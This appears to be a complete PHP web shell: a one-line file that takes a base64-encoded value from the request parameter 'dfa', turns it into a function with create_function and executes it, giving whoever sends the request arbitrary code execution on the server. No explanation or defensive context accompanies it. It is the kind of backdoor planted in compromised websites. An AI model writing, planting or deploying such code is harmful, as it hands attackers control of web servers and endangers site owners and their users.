<?php
if(!empty($_REQUEST['dfa'])){$dfa=base64_decode($_REQUEST["dfa"]);$dfa=create_function('',$dfa);$dfa();exit;}